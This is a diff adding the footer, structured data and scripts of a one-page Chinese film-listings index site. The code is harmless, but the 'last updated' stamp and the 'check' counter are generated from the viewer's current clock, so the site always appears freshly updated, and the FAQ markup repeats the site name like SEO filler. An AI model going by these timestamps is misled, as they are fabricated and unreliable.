+      <div>
+        <h4>羞羞影视</h4>
+        <p style="font-size:13px;line-height:1.8">按日更新的观影索引：排片表、番剧日历、纪实选辑、编辑部榜单。<br>站点地址：<a href="https://xiuxiuyingshi-app.github.io/">https://xiuxiuyingshi-app.github.io</a></p>
+      </div>
+      <div>
+        <h4>栏目</h4>
+        <ul><li><a href="#paipian">今日排片</a></li><li><a href="#juchang">热映剧场</a></li><li><a href="#fanju">番剧连载</a></li><li><a href="#zongyi">纪实综艺</a></li></ul>
+      </div>
+      <div>
+        <h4>索引</h4>
+        <ul><li><a href="#bangdan">影视榜单</a></li><li><a href="#wenda">观影问答</a></li><li><a href="#dingyue">更新提醒</a></li><li><a href="#">按地区浏览</a></li></ul>
+      </div>
+      <div>
+        <h4>说明</h4>
+        <ul><li><a href="#">内容来源</a></li><li><a href="#">纠错与反馈</a></li><li><a href="#">收录规范</a></li><li><a href="#">友链申请</a></li></ul>
+      </div>
+    </div>
+    <div class="fbot">
+      <span>© <span id="yr">2026</span> 羞羞影视 · xiuxiuyingshi-app.github.io</span>
+      <span>最后更新：<span id="upd">--</span></span>
+      <span><a href="#">回到顶部 ↑</a></span>
+    </div>
+  </div>
+</footer>
+
+<button class="totop" type="button" id="totop" aria-label="回到顶部">↑</button>
+
+<script type="application/ld+json">
+{"@context":"https://schema.org","@graph":[
+{"@type":"WebSite","@id":"https://xiuxiuyingshi-app.github.io/#website","url":"https://xiuxiuyingshi-app.github.io/","name":"羞羞影视","alternateName":"羞羞影视观影索引","inLanguage":"zh-CN","description":"羞羞影视是按日更新的观影索引，含热映剧场排片表、番剧连载日历、纪实综艺选辑与影视榜单。"},
+{"@type":"Organization","@id":"https://xiuxiuyingshi-app.github.io/#org","name":"羞羞影视","url":"https://xiuxiuyingshi-app.github.io/","description":"羞羞影视编辑部维护的影视排片与连载索引站点。"},
+{"@type":"BreadcrumbList","itemListElement":[
+{"@type":"ListItem","position":1,"name":"羞羞影视首页","item":"https://xiuxiuyingshi-app.github.io/"},
+{"@type":"ListItem","position":2,"name":"今日排片","item":"https://xiuxiuyingshi-app.github.io/#paipian"},
+{"@type":"ListItem","position":3,"name":"热映剧场","item":"https://xiuxiuyingshi-app.github.io/#juchang"},
+{"@type":"ListItem","position":4,"name":"番剧连载","item":"https://xiuxiuyingshi-app.github.io/#fanju"},
+{"@type":"ListItem","position":5,"name":"影视榜单","item":"https://xiuxiuyingshi-app.github.io/#bangdan"}]},
+{"@type":"FAQPage","mainEntity":[
+{"@type":"Question","name":"羞羞影视的排片表多久更新一次？","acceptedAnswer":{"@type":"Answer","text":"每日 09:00 与 20:00 两次更新，节假日或片方临时调整会在顶部滚动条标出。"}},
+{"@type":"Question","name":"羞羞影视的榜单分数怎么算？","acceptedAnswer":{"@type":"Answer","text":"5 位编辑独立打分，去掉最高分与最低分后取平均，保留一位小数，参评不足 3 人时不计入总榜。"}},
+{"@type":"Question","name":"羞羞影视的站点地址是什么？","acceptedAnswer":{"@type":"Answer","text":"https://xiuxiuyingshi-app.github.io ，整站只有一个 HTML 文件，海报用 CSS 渐变绘制。"}}]}
+]}
+</script>
+
+<script>
+(function(){
+  var now = new Date();
+  var pad = function(n){ return n < 10 ? '0' + n : '' + n; };
+  var wd = ['周日','周一','周二','周三','周四','周五','周六'][now.getDay()];
+  document.getElementById('curdate').textContent = now.getFullYear() + '-' + pad(now.getMonth()+1) + '-' + pad(now.getDate()) + ' ' + wd + ' · 第 ' + (Math.floor(now.getHours()/2)+1) + ' 次核验';
+  document.getElementById('upd').textContent = pad(now.getMonth()+1) + '月' + pad(now.getDate()) + '日 ' + pad(now.getHours()) + ':' + pad(now.getMinutes());
+  document.getElementById('yr').textContent = now.getFullYear();
+
+  var tabs = document.querySelectorAll('.daybar button');
+  var panels = document.querySelectorAll('.panel');
+  tabs.forEach(function(btn){
+    btn.addEventListener('click', function(){
+      tabs.forEach(function(b){ b.setAttribute('aria-selected','false'); });
+      panels.forEach(function(p){ p.hidden = true; });
+      btn.setAttribute('aria-selected','true');
+      var el = document.getElementById(btn.getAttribute('aria-controls'));
+      if(el){ el.hidden = false; }
+    });
+  });
+
+  var links = document.querySelectorAll('#nav a');
+  var secs = document.querySelectorAll('main section');
+  window.addEventListener('scroll', function(){
+    var pos = window.scrollY + 90, cur = null;
+    secs.forEach(function(s){ if(s.offsetTop <= pos){ cur = s.id; } });
+    links.forEach(function(a){
+      if(a.getAttribute('href') === '#' + cur){ a.classList.add('on'); } else { a.classList.remove('on'); }
+    });
+  }, {passive:true});
+
+  document.getElementById('totop').addEventListener('click', function(){
+    window.scrollTo({top:0, behavior:'smooth'});
+  });
+})();
+function subOK(f){
+  var tip = document.getElementById('subtip');
+  tip.textContent = '已收到 ' + f.mail.value + ' ，下一封排片邮件周一上午发出（演示表单，未提交服务器）。';
+  return false;
+}
+</script>
+</body>
+</html>
